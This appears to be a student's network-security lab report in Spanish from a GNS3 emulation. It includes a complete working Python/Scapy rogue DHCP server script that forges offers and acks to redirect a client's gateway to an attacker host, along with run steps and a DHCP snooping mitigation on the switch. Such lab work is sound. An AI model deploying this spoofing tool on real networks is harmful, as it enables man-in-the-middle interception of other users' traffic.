
---

# 🛡️Security Audit: DHCP Spoofing (Rogue DHCP Server)

---
<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>

## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui ](https://youtu.be/LzR9UAl_VxQ?si=PEMFnTaBQjNd2iE6)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar la vulnerabilidad intrínseca en el proceso de negociación de cuatro pasos de DHCP (DORA) ante la introducción de un servidor no autorizado (*Rogue DHCP Server*). El laboratorio demuestra cómo un atacante puede alterar los parámetros lógicos críticos de la red (falsificando la puerta de enlace predeterminada y el servidor DNS) para consolidar un ataque de interceptación de tráfico de Capa 3 sin alterar físicamente los enlaces, validando la efectividad del mecanismo de **DHCP Snooping Trust Boundaries** como contención.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** operando bajo el segmento IP corporativo `10.25.83.0/24`.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | f0/0.83 | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | f0/0.99 | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | Vlan99 | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | Vlan99 | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | eth0 | Acceso Estático | 10.25.83.12 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | e0 | Acceso Dinámico | Asignada DHCP | 255.255.255.0 | Variable (MitM) | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnica del Script (`dhcp_spoofing.py`)

### Análisis Operativo del Código

La herramienta funciona en modo escucha activa (*Sniffing*) filtrando exclusivamente el puerto UDP 67. El script procesa el tráfico entrante de manera reactiva en dos fases clave:

1. **Fase de Oferta (DHCPOFFER):** Al interceptar un mensaje `DHCP Discover` (tipo 1) proveniente de cualquier host (como `PC1`), el script construye de inmediato una respuesta unicast asignando la IP objetivo fija (`10.25.83.150`), pero alterando el parámetro `router` para apuntar a la dirección del Kali (`10.25.83.12`).
2. **Fase de Confirmación (DHCPACK):** Al capturar el posterior mensaje `DHCP Request` (tipo 3) del cliente, el script responde con un paquete `ACK` definitivo (tipo 5), ganándole la carrera de velocidad al servidor legítimo corporativo gracias a la inyección directa en la Capa 2.

### Código de la Herramienta

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

interface = "eth0"

# ==========================================================
# CONFIGURACIÓN DEL SERVIDOR FALSO
# ==========================================================
fake_ip = "10.25.83.150"       # IP para la PC
fake_router = "10.25.83.12"    # IP de tu Kali (Gateway Falso)
fake_dns = "8.8.8.8"           
subnet_mask = "255.255.255.0"
server_ip = "10.25.83.12"      # IP de tu Kali
# ==========================================================

print(f"[*] Iniciando Servidor DHCP de dos fases para GNS3 en {interface}...")

def dhcp_reply(pkt):
    if pkt.haslayer(DHCP):
        message_type = pkt[DHCP].options[0][1]
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        
        # FASE 1: Responder al DISCOVER (1) con un OFFER
        if message_type == 1:
            print(f"[+] Discover detectado de {client_mac}. Enviando Offer...")
            
            offer_pkt = (
                Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                IP(src=server_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=fake_ip, siaddr=server_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) /
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", server_ip),
                    ("subnet_mask", subnet_mask),
                    ("router", fake_router),
                    ("name_server", fake_dns),
                    ("lease_time", 86400),
                    "end"
                ])
            )
            sendp(offer_pkt, iface=interface, verbose=False)

        # FASE 2: Responder al REQUEST (3) con el ACK (5) definitivo
        elif message_type == 3:
            print(f"[+] Request detectado de {client_mac}. Enviando ACK definitivo...")
            
            ack_pkt = (
                Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                IP(src=server_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=fake_ip, siaddr=server_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) /
                DHCP(options=[
                    ("message-type", "ack"),
                    ("server_id", server_ip),
                    ("subnet_mask", subnet_mask),
                    ("router", fake_router),
                    ("name_server", fake_dns),
                    ("lease_time", 86400),
                    "end"
                ])
            )
            sendp(ack_pkt, iface=interface, verbose=False)
            print(f"[----------- ¡ATAQUE EXITOSO PARA LA MAC {client_mac}! -----------]\n")

try:
    sniff(iface=interface, filter="udp and port 67", prn=dhcp_reply, store=0)
except KeyboardInterrupt:
    print("\n[-] Servidor DHCP Falso apagado.")
    sys.exit(0)

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Inicialización del Servidor Falso

Desde la consola de Kali Linux, otorgue los privilegios requeridos y ejecute el script en segundo plano para comenzar la escucha activa del segmento de red:

```bash
chmod +x dhcp_spoofing.py
sudo ./dhcp_spoofing.py

```

### Paso 2: Forzar Solicitud Dinámica en el Cliente

Vaya a la terminal de la estación de trabajo legítima **PC1** y libere cualquier configuración previa para inicializar el ciclo de negociación DORA:

```text
PC1> ip dhcp

```

### Paso 3: Análisis Forense del Direccionamiento Corrupto

Una vez que el script de Scapy imprima en pantalla la confirmación del `[----------- ¡ATAQUE EXITOSO! -----------]`, inspeccione los parámetros de red asignados en **PC1**:

```text
PC1> show ip

```

*Diagnóstico esperado:* El nodo cliente habrá tomado la dirección `10.25.83.150`, pero su Gateway estará apuntando a la IP `10.25.83.12` (Kali), permitiendo la intercepción de todo su tráfico de salida de la red corporativa.

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> El principio fundamental para mitigar el DHCP Spoofing se basa en la segmentación estricta de interfaces de confianza (*Trust Boundaries*). Por defecto, bajo DHCP Snooping, todos los puertos son no confiables y descartarán respuestas DHCP provenientes de servidores (como Offer y Ack) a menos que se configure explícitamente el comando de confianza.

### Configuración Defensiva (Copiar y pegar en SW2)

Aplique las siguientes directivas en el conmutador perimetral **SW2** para restringir el paso de tramas de servicio únicamente desde el puerto de enlace ascendente (*Uplink*) legítimo:

```text
configure terminal
!
! 1. Activación global de la inspección DHCP en el Switch
ip dhcp snooping
ip dhcp snooping vlan 83
no ip dhcp snooping information option
!
! 2. Configurar la interfaz troncal hacia el Router/Core como CONFIABLE
interface GigabitEthernet0/2
 description UPLINK_HACIA_SERVIDOR_DHCP_REAL
 ip dhcp snooping trust
exit
!
! Nota: Las interfaces Gi0/3 (Kali) y Gi1/0 (PC1) permanecen como UNTRUSTED por defecto
end

```

### Comprobación de la Eficiencia de la Defensa

Si vuelve a ejecutar el comando `ip dhcp` en la estación **PC1** con la mitigación activa, las respuestas falsas (`DHCPOFFER`/`DHCPACK`) enviadas por el script desde la interfaz `Gi0/3` del atacante serán interceptadas y destruidas inmediatamente por la lógica interna del switch **SW2**, debido a que se originan en un puerto no confiable.

El switch generará una advertencia de seguridad en su consola:

```text
%DHCP_SNOOPING-5-INVALID_PACKET: DHCP Snooping packet with invalid structural fields dropped on interface GigabitEthernet0/3

```

La estación **PC1** ignorará el intento de intrusión y recibirá sus parámetros IP exclusivamente desde el enrutador legítimo **R1**.

---

## ⚖️ 6. Aviso de Uso Académico

Este repositorio se ha diseñado estrictamente con fines formativos para cumplir con el programa académico de la asignatura **Seguridad de Redes** en el **ITLA**. Está prohibido su uso para actividades no autorizadas, quedando el uso de este material bajo estricta responsabilidad del operador técnico.
